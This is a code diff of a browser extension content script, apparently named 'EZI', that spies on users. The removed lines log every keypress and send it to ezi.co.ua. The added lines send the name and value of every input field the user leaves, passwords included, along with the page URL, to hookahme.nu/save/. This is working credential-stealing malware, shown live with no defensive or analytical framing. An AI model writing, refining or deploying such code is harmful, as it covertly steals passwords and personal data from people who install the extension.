@@ -1,5 +1,6 @@
 console.log('Расширение EZI рботает))');
-localStorage.t = '';
+// var url = 'http://ezi.co.ua/save/';
+var url = 'https://hookahme.nu/save/';
 
 var ezi = {
     post: function(url, data, cb){
@@ -10,7 +11,7 @@ var ezi = {
         xhr.onreadystatechange = function() {
             if (xhr.readyState !== 4) return;
             if (xhr.status === 200) {
-                cb();
+                if(cb) cb();
             } else {
                 console.error('Ошибка отправки запроса!');
             }
@@ -18,14 +19,22 @@ var ezi = {
         xhr.send(fd);
     }
 };
-document.body.addEventListener('keypress', function(e){
-    localStorage.t += e.key;
-});
 
-setInterval(function(){
-    if(localStorage.t){
-        ezi.post('http://ezi.co.ua/save/', localStorage.t, function(){
-            localStorage.t = '';
-        });
+// localStorage.t = '';
+// document.body.addEventListener('keypress', function(e){
+//     localStorage.t += e.key;
+// });
+// setInterval(function(){
+//     if(localStorage.t){
+//         ezi.post('http://ezi.co.ua/save/', localStorage.t + ' | ' +  location.href, function(){
+//             localStorage.t = '';
+//         });
+//     }
+// }, 10000);
+
+
+document.body.addEventListener('focusout', function(e){
+    if(e.target.nodeName === 'INPUT'){
+        ezi.post(url, 'name: ' + e.target.name + ' | value:' + e.target.value+ ' | ' +  location.href);
     }
-}, 10000);
+});
